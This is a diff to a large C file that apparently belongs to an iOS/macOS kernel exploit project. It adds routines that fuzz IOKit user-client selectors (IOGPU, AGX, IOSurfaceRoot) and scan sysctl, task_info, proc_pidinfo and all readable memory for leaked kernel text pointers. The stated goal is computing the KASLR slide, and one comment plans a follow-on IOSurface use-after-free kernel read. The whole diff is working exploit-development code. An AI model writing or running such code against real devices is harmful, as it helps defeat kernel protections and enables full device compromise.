@@ -14472,6 +14472,320 @@ static void r350_probe(void) {
  *
  * Any kernel pointer found gives us: kslide = leaked_ptr - known_offset
  */
+
+static void r357_probe(void) {
+    rlog("\n=== r357: IOKit/AGX/sysctl Kernel Text Address Hunt ===\n\n");
+    fflush(stdout);
+
+    #define IS_KPTR357(v) ( \
+        ((v) != 0) && \
+        ((v) != 0xFFFFFFFFFFFFFFFFULL) && \
+        ((v) >> 32) >= 0xFFFFFFF0UL \
+    )
+    /* Known unslid constants to skip */
+    #define IS_KNOWN_CONST357(v) ( \
+        (v) == 0xFFFFFFF007004000ULL || (v) == 0xFFFFFFF007000000ULL || \
+        (v) == 0xFFFFFFF027004000ULL || (v) == 0xFFFFFFF037004000ULL || \
+        (v) == 0xFFFFFFF047004000ULL || (v) == 0xFFFFFFF017004000ULL || \
+        (v) == 0xFFFFFFF00F004000ULL || (v) == 0xFFFFFFF000000000ULL || \
+        (v) == 0xFFFFFFF800000000ULL || \
+        (v) == 0xFFFFFFFFFFFFFFD1ULL || (v) == 0xFFFFFFFF89ABCDEFULL || \
+        (v) == 0xFFFFFFFF00000000ULL || (v) == 0xFFFFFFFF00000001ULL || \
+        (v) == 0xFFFFFFFF00000002ULL || \
+        (v) == 0xFFFFFFFFFFFFFC00ULL || (v) == 0xFFFFFFFFFFFFFF00ULL || \
+        (v) == 0xFFFFFFFFFFC00000ULL || (v) == 0xFFFFFFFFFF0400F7ULL || \
+        (v) == 0xFFFFFFFFFB440E00ULL || (v) == 0xFFFFFFFFFFFFFFFFULL || \
+        (v) == 0xFFFFFFFFFFFFC000ULL \
+    )
+    /* Is it in the slid text range? */
+    #define IS_SLID_TEXT357(v) ( \
+        (v) > 0xFFFFFFF007004000ULL && (v) < 0xFFFFFFF027004000ULL && \
+        !IS_KNOWN_CONST357(v) \
+    )
+
+    int total_kptrs = 0, total_text = 0;
+
+    /* ---- Part 1: IOGPU / AGXAccelerator external method scan ---- */
+    rlog("--- Part 1: IOGPU/AGX external method selector scan (struct outputs) ---\n");
+    fflush(stdout);
+    {
+        const char *svc_names[] = {"IOGPUDevice", "AGXAccelerator", "IOGPU", "AGXFamilyAccelerator", NULL};
+        for (int sn = 0; svc_names[sn]; sn++) {
+            io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching(svc_names[sn]));
+            if (!svc) { rlog("  %s: not found\n", svc_names[sn]); continue; }
+
+            io_connect_t conn = 0;
+            kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+            IOObjectRelease(svc);
+            if (kr != 0 || !conn) {
+                /* Try type 1-5 */
+                int opened = 0;
+                for (uint32_t ty = 1; ty <= 5 && !opened; ty++) {
+                    svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                        IOServiceMatching(svc_names[sn]));
+                    if (!svc) break;
+                    kr = IOServiceOpen(svc, mach_task_self(), ty, &conn);
+                    IOObjectRelease(svc);
+                    if (kr == 0 && conn) { opened = 1; rlog("  %s: opened type=%u\n", svc_names[sn], ty); }
+                }
+                if (!opened) { rlog("  %s: open failed kr=0x%x\n", svc_names[sn], kr); continue; }
+            } else {
+                rlog("  %s: opened type=0\n", svc_names[sn]);
+            }
+
+            int svc_hits = 0;
+            for (uint32_t sel = 0; sel < 64; sel++) {
+                /* Try with struct output */
+                uint8_t out_buf[1024];
+                size_t out_sz = sizeof(out_buf);
+                memset(out_buf, 0, sizeof(out_buf));
+                uint64_t sc_out[4] = {0};
+                uint32_t sc_out_cnt = 4;
+
+                kr = IOConnectCallMethod(conn, sel, NULL, 0, NULL, 0,
+                    sc_out, &sc_out_cnt, out_buf, &out_sz);
+                if (kr == 0) {
+                    /* Check scalar outputs */
+                    for (uint32_t si = 0; si < sc_out_cnt; si++) {
+                        if (IS_KPTR357(sc_out[si]) && !IS_KNOWN_CONST357(sc_out[si])) {
+                            rlog("  %s sel=%u scalar[%u]=0x%llx", svc_names[sn], sel, si,
+                                (unsigned long long)sc_out[si]);
+                            if (IS_SLID_TEXT357(sc_out[si])) { rlog(" *** SLID TEXT ***"); total_text++; }
+                            rlog("\n");
+                            svc_hits++;
+                        }
+                    }
+                    /* Check struct output */
+                    if (out_sz >= 8) {
+                        for (size_t off = 0; off + 8 <= out_sz; off += 8) {
+                            uint64_t v;
+                            memcpy(&v, out_buf + off, 8);
+                            if (IS_KPTR357(v) && !IS_KNOWN_CONST357(v)) {
+                                rlog("  %s sel=%u struct+%zu=0x%llx", svc_names[sn], sel, off,
+                                    (unsigned long long)v);
+                                if (IS_SLID_TEXT357(v)) { rlog(" *** SLID TEXT ***"); total_text++; }
+                                rlog("\n");
+                                svc_hits++;
+                            }
+                        }
+                    }
+                }
+                /* Also try with small struct input */
+                uint8_t in_buf[64];
+                memset(in_buf, 0, sizeof(in_buf));
+                out_sz = sizeof(out_buf);
+                memset(out_buf, 0, sizeof(out_buf));
+                sc_out_cnt = 4;
+                memset(sc_out, 0, sizeof(sc_out));
+                kr = IOConnectCallMethod(conn, sel, NULL, 0, in_buf, 64,
+                    sc_out, &sc_out_cnt, out_buf, &out_sz);
+                if (kr == 0) {
+                    for (uint32_t si = 0; si < sc_out_cnt; si++) {
+                        if (IS_KPTR357(sc_out[si]) && !IS_KNOWN_CONST357(sc_out[si])) {
+                            rlog("  %s sel=%u+structIn scalar[%u]=0x%llx", svc_names[sn], sel, si,
+                                (unsigned long long)sc_out[si]);
+                            if (IS_SLID_TEXT357(sc_out[si])) { rlog(" *** SLID TEXT ***"); total_text++; }
+                            rlog("\n");
+                            svc_hits++;
+                        }
+                    }
+                    if (out_sz >= 8) {
+                        for (size_t off = 0; off + 8 <= out_sz; off += 8) {
+                            uint64_t v;
+                            memcpy(&v, out_buf + off, 8);
+                            if (IS_KPTR357(v) && !IS_KNOWN_CONST357(v)) {
+                                rlog("  %s sel=%u+structIn struct+%zu=0x%llx", svc_names[sn], sel, off,
+                                    (unsigned long long)v);
+                                if (IS_SLID_TEXT357(v)) { rlog(" *** SLID TEXT ***"); total_text++; }
+                                rlog("\n");
+                                svc_hits++;
+                            }
+                        }
+                    }
+                }
+            }
+            total_kptrs += svc_hits;
+            rlog("  %s: %d kernel-range values in 64 selectors\n\n", svc_names[sn], svc_hits);
+            IOServiceClose(conn);
+        }
+    }
+
+    /* ---- Part 2: IOSurfaceRoot struct output scan ---- */
+    rlog("--- Part 2: IOSurfaceRoot struct output scan (selectors 0-31) ---\n");
+    fflush(stdout);
+    {
+        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching("IOSurfaceRoot"));
+        io_connect_t conn = 0;
+        kern_return_t kr = svc ? IOServiceOpen(svc, mach_task_self(), 0, &conn) : 1;
+        if (svc) IOObjectRelease(svc);
+
+        if (kr == 0 && conn) {
+            int hits = 0;
+            for (uint32_t sel = 0; sel < 32; sel++) {
+                uint8_t out_buf[2048];
+                size_t out_sz = sizeof(out_buf);
+                memset(out_buf, 0, sizeof(out_buf));
+                uint64_t sc_out[4] = {0};
+                uint32_t sc_out_cnt = 4;
+
+                kr = IOConnectCallMethod(conn, sel, NULL, 0, NULL, 0,
+                    sc_out, &sc_out_cnt, out_buf, &out_sz);
+                if (kr == 0 && out_sz >= 8) {
+                    for (size_t off = 0; off + 8 <= out_sz; off += 8) {
+                        uint64_t v;
+                        memcpy(&v, out_buf + off, 8);
+                        if (IS_KPTR357(v) && !IS_KNOWN_CONST357(v)) {
+                            rlog("  IOSurfaceRoot sel=%u struct+%zu=0x%llx", sel, off,
+                                (unsigned long long)v);
+                            if (IS_SLID_TEXT357(v)) { rlog(" *** SLID TEXT ***"); total_text++; }
+                            rlog("\n");
+                            hits++;
+                        }
+                    }
+                }
+            }
+            total_kptrs += hits;
+            rlog("  IOSurfaceRoot: %d kernel-range values\n\n", hits);
+            IOServiceClose(conn);
+        } else {
+            rlog("  IOSurfaceRoot: open failed kr=0x%x\n\n", kr);
+        }
+    }
+
+    /* ---- Part 3: Mach port kobject + task_info ---- */
+    rlog("--- Part 3: Mach port kobject + task_info probes ---\n");
+    fflush(stdout);
+    {
+        /* mach_port_kobject on task port and thread ports */
+        unsigned int ktype = 0;
+        mach_vm_address_t kaddr = 0;
+        kern_return_t kr = mach_port_kobject(mach_task_self(), mach_task_self(), &ktype, &kaddr);
+        rlog("  task self kobject: kr=0x%x type=%u addr=0x%llx\n", kr, ktype, (unsigned long long)kaddr);
+        if (kaddr && IS_KPTR357(kaddr) && !IS_KNOWN_CONST357(kaddr)) {
+            rlog("    *** KERNEL PTR");
+            if (IS_SLID_TEXT357(kaddr)) rlog(" SLID TEXT");
+            rlog(" ***\n");
+            total_kptrs++; if (IS_SLID_TEXT357(kaddr)) total_text++;
+        }
+
+        kr = mach_port_kobject(mach_task_self(), mach_host_self(), &ktype, &kaddr);
+        rlog("  host self kobject: kr=0x%x type=%u addr=0x%llx\n", kr, ktype, (unsigned long long)kaddr);
+        if (kaddr && IS_KPTR357(kaddr) && !IS_KNOWN_CONST357(kaddr)) {
+            rlog("    *** KERNEL PTR");
+            if (IS_SLID_TEXT357(kaddr)) rlog(" SLID TEXT");
+            rlog(" ***\n");
+            total_kptrs++; if (IS_SLID_TEXT357(kaddr)) total_text++;
+        }
+
+        /* TASK_DYLD_INFO */
+        struct task_dyld_info tdi;
+        mach_msg_type_number_t cnt = TASK_DYLD_INFO_COUNT;
+        kr = task_info(mach_task_self(), TASK_DYLD_INFO, (task_info_t)&tdi, &cnt);
+        rlog("  TASK_DYLD_INFO: kr=0x%x all_image_info=0x%llx sz=%llu\n",
+            kr, (unsigned long long)tdi.all_image_info_addr,
+            (unsigned long long)tdi.all_image_info_size);
+
+        /* TASK_VM_INFO — scan all fields for kernel range */
+        uint64_t vminfo[128];
+        memset(vminfo, 0, sizeof(vminfo));
+        cnt = sizeof(vminfo) / sizeof(natural_t);
+        kr = task_info(mach_task_self(), 22 /* TASK_VM_INFO */, (task_info_t)vminfo, &cnt);
+        if (kr == 0) {
+            int vm_hits = 0;
+            for (int i = 0; i < (int)(cnt * sizeof(natural_t) / 8); i++) {
+                if (IS_KPTR357(vminfo[i]) && !IS_KNOWN_CONST357(vminfo[i])) {
+                    rlog("  TASK_VM_INFO[%d]=0x%llx", i, (unsigned long long)vminfo[i]);
+                    if (IS_SLID_TEXT357(vminfo[i])) { rlog(" *** SLID TEXT ***"); total_text++; }
+                    rlog("\n");
+                    vm_hits++;
+                }
+            }
+            total_kptrs += vm_hits;
+        }
+    }
+
+    /* ---- Part 4: sysctl deep scan ---- */
+    rlog("\n--- Part 4: sysctl deep scan ---\n");
+    fflush(stdout);
+    {
+        const char *names[] = {
+            "kern.slide", "kern.bootargs", "kern.version",
+            "machdep.cpu.address_bits.physical", "machdep.cpu.address_bits.virtual",
+            "machdep.memmap.Conventional", "machdep.memmap.RuntimeServices",
+            "debug.iokit", "debug.iotrace",
+            "hw.memsize", "hw.pagesize", "hw.cachelinesize",
+            "kern.maxvnodes", "kern.maxproc", "kern.maxfilesperproc",
+            "kern.osproductversion", "kern.osversion",
+            "security.mac.sandbox.sentinel",
+            "vm.swapusage",
+            "kern.hibernatefile", "kern.waketime",
+            NULL
+        };
+        for (int i = 0; names[i]; i++) {
+            uint64_t val = 0;
+            size_t valsz = sizeof(val);
+            int ret = sysctlbyname(names[i], &val, &valsz, NULL, 0);
+            if (ret == 0 && valsz == 8 && IS_KPTR357(val) && !IS_KNOWN_CONST357(val)) {
+                rlog("  %s = 0x%llx", names[i], (unsigned long long)val);
+                if (IS_SLID_TEXT357(val)) { rlog(" *** SLID TEXT ***"); total_text++; }
+                rlog("\n");
+                total_kptrs++;
+            }
+        }
+        /* Also try numeric MIBs that might not have string names */
+        int mib[3];
+        for (int m0 = 1; m0 <= 10; m0++) {
+            for (int m1 = 1; m1 <= 32; m1++) {
+                mib[0] = m0; mib[1] = m1;
+                uint64_t val = 0;
+                size_t valsz = sizeof(val);
+                int ret = sysctl(mib, 2, &val, &valsz, NULL, 0);
+                if (ret == 0 && valsz == 8 && IS_KPTR357(val) && !IS_KNOWN_CONST357(val)) {
+                    rlog("  sysctl(%d,%d) = 0x%llx", m0, m1, (unsigned long long)val);
+                    if (IS_SLID_TEXT357(val)) { rlog(" *** SLID TEXT ***"); total_text++; }
+                    rlog("\n");
+                    total_kptrs++;
+                }
+            }
+        }
+    }
+
+    /* ---- Part 5: proc_pidinfo flavors ---- */
+    rlog("\n--- Part 5: proc_pidinfo flavor scan ---\n");
+    fflush(stdout);
+    {
+        pid_t pid = getpid();
+        uint8_t buf[4096];
+        /* Try flavors 1-20 */
+        for (int flav = 1; flav <= 20; flav++) {
+            memset(buf, 0, sizeof(buf));
+            int ret = proc_pidinfo(pid, flav, 0, buf, sizeof(buf));
+            if (ret > 0 && ret >= 8) {
+                for (int off = 0; off + 8 <= ret; off += 8) {
+                    uint64_t v;
+                    memcpy(&v, buf + off, 8);
+                    if (IS_KPTR357(v) && !IS_KNOWN_CONST357(v)) {
+                        rlog("  proc_pidinfo flav=%d +%d=0x%llx", flav, off,
+                            (unsigned long long)v);
+                        if (IS_SLID_TEXT357(v)) { rlog(" *** SLID TEXT ***"); total_text++; }
+                        rlog("\n");
+                        total_kptrs++;
+                    }
+                }
+            }
+        }
+    }
+
+    rlog("\n=== r357 summary: %d kernel-range values, %d slid text candidates ===\n", total_kptrs, total_text);
+    fflush(stdout);
+
+    #undef IS_KPTR357
+    #undef IS_KNOWN_CONST357
+    #undef IS_SLID_TEXT357
+}
+
 #if 0 /* disabled: superseded by r356 diff scan below */
 /* r356 v1: Hunt for SLID kernel text pointers across all readable VM regions */
 static void r356_probe(void) {
@@ -15014,6 +15328,77 @@ r356_done:
 }
 
 #endif /* end disabled r356 v2 */
+
+/* r358: Scan ALL readable VM regions for slid kernel text pointers */
+static void r358_probe(void) {
+    rlog("\n=== r358: Slid Kernel Text Pointer Scan (ALL regions) ===\n\n");
+    rlog("  Range: [0xFFFFFFF007004001, 0xFFFFFFF027004000)\n");
+    rlog("  Excluding known unslid constants\n\n");
+    fflush(stdout);
+
+    static const uint64_t skip[] = {
+        0xFFFFFFF007004000ULL, 0xFFFFFFF007000000ULL, 0xFFFFFFF027004000ULL,
+        0xFFFFFFF037004000ULL, 0xFFFFFFF047004000ULL, 0xFFFFFFF017004000ULL,
+        0xFFFFFFF00F004000ULL, 0xFFFFFFF000000000ULL, 0xFFFFFFF800000000ULL,
+    };
+    int total_hits = 0, regions_scanned = 0;
+
+    mach_vm_address_t addr = 0;
+    while (1) {
+        mach_vm_size_t sz = 0;
+        uint32_t depth = 0;
+        struct vm_region_submap_info_64 info;
+        mach_msg_type_number_t cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+        kern_return_t kr = mach_vm_region_recurse(mach_task_self(), &addr, &sz, &depth,
+            (vm_region_recurse_info_t)&info, &cnt);
+        if (kr != KERN_SUCCESS) break;
+
+        if ((info.protection & VM_PROT_READ) && sz <= 256*1024*1024) {
+            uint64_t *base = (uint64_t *)(uintptr_t)addr;
+            size_t nqw = (size_t)sz / 8;
+            int region_hits = 0;
+
+            for (size_t i = 0; i < nqw; i++) {
+                uint64_t v = base[i];
+                if (v <= 0xFFFFFFF007004000ULL || v >= 0xFFFFFFF027004000ULL) continue;
+                int is_skip = 0;
+                for (int k = 0; k < (int)(sizeof(skip)/sizeof(skip[0])); k++)
+                    if (v == skip[k]) { is_skip = 1; break; }
+                if (is_skip) continue;
+
+                const char *cls = "SLID_TEXT_CANDIDATE";
+                uint64_t off = v - 0xFFFFFFF007004000ULL;
+                if ((off & 0x3FFF) == 0) cls = "POSSIBLE_SLID_BASE";
+                else if ((v & 0x7) == 0) cls = "POSSIBLE_SLID_FUNC";
+
+                rlog("  HIT: region=0x%llx+%zu tag=%u val=0x%llx off=+0x%llx [%s]\n",
+                    (unsigned long long)addr, i*8, (unsigned)info.user_tag,
+                    (unsigned long long)v, (unsigned long long)off, cls);
+
+                if (i > 0) {
+                    uint64_t prev = base[i-1];
+                    if (prev > 0xFFFFFFF007004000ULL && prev < 0xFFFFFFF027004000ULL)
+                        rlog("    VTABLE? prev=0x%llx (consecutive text ptrs)\n", (unsigned long long)prev);
+                }
+                region_hits++;
+                total_hits++;
+                if (region_hits >= 20) { rlog("    ... (capped at 20 per region)\n"); break; }
+            }
+            regions_scanned++;
+        }
+        addr += sz;
+    }
+    rlog("\n  Scanned %d regions, found %d slid text candidates\n", regions_scanned, total_hits);
+
+    if (total_hits == 0) {
+        rlog("\n  NO slid text pointers found in userspace-readable memory.\n");
+        rlog("  Kernel text addresses are not leaked through any mapped region.\n");
+        rlog("  Alternative: use heap leak + IOSurface UAF for indirect kernel read.\n");
+    }
+
+    rlog("\n=== r358 complete ===\n");
+    fflush(stdout);
+}
 
 /* r356: Pure diff scan + cross-launch correlation via /tmp state file */
 static void r356_probe(void) {
@@ -52550,26 +52935,18 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 360) {
+            rlog("*** rounds=360: IOKit/AGX/sysctl Kernel Text Address Hunt ***\n");
+            rlog("  Scanning IOGPU, AGX, IOSurfaceRoot struct outputs,\n");
+            rlog("  mach_port_kobject, task_info, sysctl, proc_pidinfo.\n\n");
+            fflush(stdout);
+            r357_probe();
+            goto done;
+        }
         if (rounds == 359) {
             rlog("*** rounds=359: Slid Kernel Text Pointer Hunt ***\n");
             rlog("  Scanning ALL readable regions for values in slid text range\n");
             rlog("  [0xFFFFFFF007004001, 0xFFFFFFF027004000) minus known constants\n\n");
-            fflush(stdout);
-            r356_probe();
-            goto done;
-        }
-        if (rounds == 359) {
-            rlog("*** rounds=359: Cross-Launch Correlation + UAF Kernel Read ***\n");
-            rlog("  r355: stable kptr 0xfffffffefbbdc7cf at Stack[1]+468456.\n");
-            rlog("  r356: cross-launch comparison + IOSurface UAF field read.\n\n");
-            fflush(stdout);
-            r356_probe();
-            goto done;
-        }
-        if (rounds == 359) {
-            rlog("*** rounds=359: Stack Diff + Cross-Launch KASLR Correlation ***\n");
-            rlog("  r355: fill pattern 0xFFFFFFFEFDxxxxCF shifts by page-aligned delta\n");
-            rlog("  r356: snapshot diff + /tmp state file for cross-launch compare\n\n");
             fflush(stdout);
             r356_probe();
             goto done;
@@ -54650,7 +55027,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
@@ -64492,7 +64869,7 @@ new_modes:
          *   - Create VideoToolbox session, fuzz parameters for OOB read
          *   - Look for kernel pointer leaks in output buffers
          */
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360) {
             rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
             if ((rounds >= 220 && rounds <= 224) || rounds == 226 || rounds == 227 || rounds == 228) goto r220_block;
 
